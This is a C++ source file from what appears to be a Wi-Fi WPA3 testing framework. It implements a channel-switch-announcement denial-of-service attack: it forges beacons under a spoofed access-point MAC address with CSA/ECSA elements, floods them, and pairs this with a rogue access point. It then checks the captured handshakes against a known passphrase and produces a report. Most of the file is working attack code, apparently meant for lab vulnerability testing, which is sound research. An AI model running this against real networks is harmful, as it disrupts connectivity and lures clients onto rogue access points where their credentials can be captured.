#include "attacks/DoS_soft/channel_switch/channel_switch.h"
#include <algorithm>
#include <cassert>
#include <chrono>
#include <filesystem>
#include <nlohmann/json.hpp>
#include <optional>
#include <thread>

#include "attacks/components/setup_connections.h"
#include "ex_program/external_actors/ExternalConn.h"
#include "ex_program/hostapd/hostapd_helper.h"
#include "interrupt.h"
#include "logger/error_log.h"
#include "logger/log_util.h"
#include "logger/report.h"
#include "observer/observers.h"
#include "observer/tshark_wrapper.h"
#include "overview/described.h"
#include "scan/active/scan_AP.h"
#include "system/hw_capabilities.h"
#include "visual/result_helper.h"

namespace wpa3_tester::CSA_attack {
using namespace std;
using namespace filesystem;
using namespace Tins;
using namespace chrono;

using namespace observer::tshark;

static uint8_t get_operating_class(const Channel &ch) {
	if(ch.band == WifiBand::BAND_2_4) return 81;
	// IEEE 802.11-2020 Table E-4, 20 MHz classes
	const uint8_t n = ch.ch_num;
	if(n >= 36 && n <= 48) return 115;
	if(n >= 52 && n <= 64) return 118;
	if(n >= 100 && n <= 140) return 121;
	if(n >= 149 && n <= 169) return 124;
	return n > 14 ? 115 : 81;
}

static uint8_t vht_center_ch(const uint8_t ch) {
	// 80 MHz primary channel -> center channel
	static constexpr array<pair<uint8_t, uint8_t>, 6> groups{
		{ { 36, 42 }, { 52, 58 }, { 100, 106 }, { 116, 122 }, { 132, 138 }, { 149, 155 } }
	};
	for(auto [base, center]: groups)
		if(ch >= base && ch < base + 16) return center;
	return ch;
}

static Dot11Beacon patch_ies(const Dot11Beacon &src, const Channel &ap_channel) {
	auto opts = src.options();
	vector sorted_opts(opts.begin(), opts.end());

	//TODO add this to pdf (why is filtered)

	// patch HT_OPERATION primary channel + VHT_OPERATION center channel
	for(auto &o: sorted_opts) {
		const auto id = o.option();
		if(id == static_cast<uint8_t>(Dot11::OptionTypes::DS_SET)) {
			const uint8_t ch = ap_channel.ch_num;
			o = Dot11::option(Dot11::OptionTypes::DS_SET, 1, &ch);
		} else if(id == static_cast<uint8_t>(Dot11::OptionTypes::HT_OPERATION)) {
			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
			if(!data.empty()) data[0] = static_cast<uint8_t>(ap_channel.ch_num);
			o = Dot11::option(Dot11::OptionTypes::HT_OPERATION, data.size(), data.data());
		} else if(id == 192 /* VHT_OPERATION */) {
			vector data(o.data_ptr(), o.data_ptr() + o.data_size());
			if(data.size() >= 3 && data[0] == 1) // 80 MHz: patch center channel
				data[1] = vht_center_ch(ap_channel.ch_num);
			o = Dot11::option(192, data.size(), data.data());
		}
	}

	erase_if(sorted_opts, [](const auto &o) {
		const auto id = static_cast<uint8_t>(o.option());

		static constexpr array kept_ids = {
			static_cast<uint8_t>(Dot11::OptionTypes::SSID),
			static_cast<uint8_t>(Dot11::OptionTypes::SUPPORTED_RATES),
			static_cast<uint8_t>(Dot11::OptionTypes::DS_SET),
			static_cast<uint8_t>(Dot11::OptionTypes::TIM),
			static_cast<uint8_t>(Dot11::OptionTypes::COUNTRY),
			static_cast<uint8_t>(Dot11::OptionTypes::CHANNEL_SWITCH),
			static_cast<uint8_t>(60), // ECSA
			static_cast<uint8_t>(Dot11::OptionTypes::ERP_INFORMATION),

			static_cast<uint8_t>(Dot11::OptionTypes::HT_CAPABILITY),
			static_cast<uint8_t>(Dot11::OptionTypes::HT_OPERATION),
			static_cast<uint8_t>(191), // VHT_CAPABILITY
			static_cast<uint8_t>(192), // VHT_OPERATION

			static_cast<uint8_t>(Dot11::OptionTypes::RSN),
			static_cast<uint8_t>(Dot11::OptionTypes::EXT_SUPPORTED_RATES),
			static_cast<uint8_t>(Dot11::OptionTypes::SUPPORTED_OP_CLASSES),
			static_cast<uint8_t>(Dot11::OptionTypes::EXT_CAP),
			static_cast<uint8_t>(Dot11::OptionTypes::VENDOR_SPECIFIC),
		};
		if(ranges::find(kept_ids, id) == kept_ids.end()) return true; //erase

		// filter out useless VENDOR_SPECIFIC IE tags
		// allow only  00:50:F2 (type 1 - Microsoft Qos, type 2- WMM/WME)
		if(id == static_cast<uint8_t>(Dot11::OptionTypes::VENDOR_SPECIFIC)) {
			// OUI (3B) + type (1B) - Microsoft/WiFi Alliance WPA/WMM
			static constexpr array<uint8_t, 3> ms_oui = { 0x00, 0x50, 0xF2 };

			const auto *data = o.data_ptr();
			const auto len = o.data_size();
			if(len < 4) return true;

			const bool oui_match = equal(ms_oui.begin(), ms_oui.end(), data);
			const uint8_t type = data[3];

			// type 1 = WPA IE, type 2 = WMM/WME
			const bool wanted_type = (type == 1 || type == 2);
			return !(oui_match && wanted_type);
		}
		return false;
	});

	ranges::sort(sorted_opts, [](const auto &a, const auto &b) {
		return static_cast<uint8_t>(a.option()) < static_cast<uint8_t>(b.option());
	});

	Dot11Beacon result(src.addr1(), src.addr2());
	result.addr3(src.addr3());
	result.capabilities() = src.capabilities();
	result.interval(src.interval());
	result.timestamp(src.timestamp());

	for(const auto &opt: sorted_opts) result.add_option(opt);
	return result;
}

//FIXME unused ssid, ap_channel
RadioTap get_CSA_beacon(const HWAddress<6> &ap_mac, const string & /*ssid*/, const Channel &ap_channel,
		const Channel &new_channel, const int switch_count, const Dot11Beacon *src_beacon) {
	Dot11Beacon b = src_beacon ? *src_beacon : Dot11Beacon{};

	Dot11ManagementFrame::channel_switch_type cs;
	cs.switch_mode = 1;
	cs.new_channel = new_channel.ch_num;
	cs.switch_count = switch_count;
	b.channel_switch(cs);

	// ECSA IE (60): switch_mode, operating_class, new_channel, switch_count
	// Required for 5 GHz - basic CSA IE has no operating class
	const array<uint8_t, 4> ecsa{
		1, get_operating_class(new_channel), new_channel.ch_num, static_cast<uint8_t>(switch_count)
	};
	b.add_option(Dot11::option(60, ecsa.size(), ecsa.data()));

	b = patch_ies(b, ap_channel);
	b.addr1(Dot11::BROADCAST);
	b.addr2(ap_mac);
	b.addr3(ap_mac);

	RadioTap radiotap{};
	radiotap.inner_pdu(b);
	return radiotap;
}

void check_vulnerable(const HWAddress<6> &ap_mac, const HWAddress<6> &sta_mac, const string &iface_name,
		const string &ssid, const Channel &ap_channel, const Channel &new_channel, const int ms_interval,
		const int attack_time) {
	PacketSender sender{ iface_name };
	const auto end_time = steady_clock::now() + seconds(attack_time);

	const unique_ptr<Dot11Beacon> beacon = scan::RSN_scan(iface_name, 20, ap_mac); //TODO hardcoded tscan_timeout
	if(!beacon) throw run_err("Not found beacon for reproduce");
	log(LogLevel::INFO,
			"check_vulnerable called with:\n"
			"AP MAC: {}\n"
			"STA MAC: {}\n"
			"Interface: {}\n"
			"Channel: {}\n"
			"SSID: {}\n",
			ap_mac,
			sta_mac,
			iface_name,
			ap_channel.ch_num,
			ssid);

	RadioTap csa_rt = get_CSA_beacon(ap_mac, ssid, ap_channel, new_channel, 3, beacon.get());
	while(steady_clock::now() < end_time) {
		sender.send(csa_rt);
		interruptible_sleep(milliseconds(ms_interval));
	}
}

// ----------------- MODULE functions ------------------
void setup_chs_attack(RunStatus &rs) {
	// only setup if can
	components::client_ap_setup(rs, false);
	components::setup_rogue_ap(rs);
}

void run_attack(RunStatus &rs) {
	const auto &att_cfg = rs.config().at("attack_config");
	const auto &ap = rs.get_actor("ap");

	const HWAddress<6> ap_mac(rs.get_actor("ap").get(SK::mac));
	const HWAddress<6> sta_mac(rs.get_actor("client").get(SK::mac));
	const string iface_name = rs.get_actor("attacker").get(SK::iface);
	const string essid = ap.get(SK::ssid);
	const Channel old_channel = ap->get_channel();
	const Channel new_channel{
		att_cfg.at("new_channel").get<uint8_t>(), ap->get_channel().band, ap[SK::ht_mode]
	};
	const int ms_interval = att_cfg.at("ms_interval");
	const int attack_time = att_cfg.at("attack_time");

	rs.start_observers();

	interruptible_sleep(seconds(att_cfg.at("sleep_before_sec")));
	if(g_interrupted) return;
	rs.process_manager.write_log_all(ATTACK_START_tag);
	check_vulnerable(ap_mac, sta_mac, iface_name, essid, old_channel, new_channel, ms_interval, attack_time);
	rs.process_manager.write_log_all(ATTACK_STOP_tag);
	interruptible_sleep(seconds(att_cfg.at("sleep_after_sec")));

	if(ap->conn) ap->conn->disconnect();
	rs.process_manager.stop_all();
}

void generate_report(const RunStatus &rs, const vector<unique_ptr<GraphElements>> &elements,
		const optional<hostapd::CrackResult> &crack_result) {
	report::ReportGuard report(rs.run_folder());
	if(!report) return;

	report << "# CSA DoS Attack\n\n";

	report::attack_config_table(report, rs);
	report::attack_mapping_table(report, rs);

	const path STA_graph_path = tshark_graph(rs, "client", elements);
	if(!STA_graph_path.empty()) {
		report << "### STA (client, wpa_supplicant " << hostapd::get_version(rs, "client") << ")\n";
		report << "![STA Throughput Graph](" << STA_graph_path << ")\n\n";
	}
	const path AP_graph_path = tshark_graph(rs, "ap", elements, observer::get_observer_folder(rs, "tcpdump"));
	if(!AP_graph_path.empty()) {
		report << "### AP (ap, hostapd " << hostapd::get_version(rs, "ap") << ")\n";
		report << "![AP Graph](" << AP_graph_path << ")\n\n";
	}

	const path ATT_graph_path = tshark_graph(rs, "attacker", elements);
	if(!ATT_graph_path.empty()) {
		report << "### ATT (att, hostapd-mana " << hostapd::get_version(rs, "attacker") << ")\n";
		report << "![ATT Graph](" << ATT_graph_path << ")\n\n";
	}

	const path rogue_graph_path = tshark_graph(rs, "rogue_ap", elements);
	if(!rogue_graph_path.empty()) {
		report << "###  Rogue AP (rogue_ap)\n";
		report << "![Rogue AP Graph](" << rogue_graph_path << ")\n\n";
	}

	if(crack_result.has_value()) {
		report << "## Credential Cracking (hcxpmktool)\n";
		report << "Each captured handshake was verified against the known PSK using hcxpmktool.\n\n";
		report << "| Metric | Value |\n|--------|-------|\n";
		report << "| Captured handshakes | " << crack_result->total << " |\n";
		report << "| Successfully cracked | " << crack_result->cracked << " |\n\n";
	}

	report << "---\n";
}

void stats_attack(const RunStatus &rs) {
	const string client_mac = rs.get_actor("client").get(SK::mac);

	vector<unique_ptr<GraphElements>> elements;
	rs.log_events(elements, { DISCONNECT, CONNECT, TESTER_TAGS });
	rs.log_events(elements, { { "client", "CTRL-EVENT-STARTED-CHANNEL-SWITCH", "SWITCH", "blue" } });

	pcap_events(rs,
			elements,
			{ { "attacker", "wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac, "client PROBE", "black" },
					{ "rogue_ap",
							"wlan.fc.type_subtype == 0x04 && wlan.sa == " + client_mac,
							"client PROBE",
							"red" } });

	auto [rogue_ap_connected, crack_result] = visual::helper::hostapd_mana_crack(rs, elements);
	generate_report(rs, elements, crack_result);

	nlohmann::json result{};
	result["rogue_ap_connected"] = rogue_ap_connected;
	if(crack_result) { result["cracked"] = crack_result.value().cracked != 0; }

	rs.save_result(result);
}
}
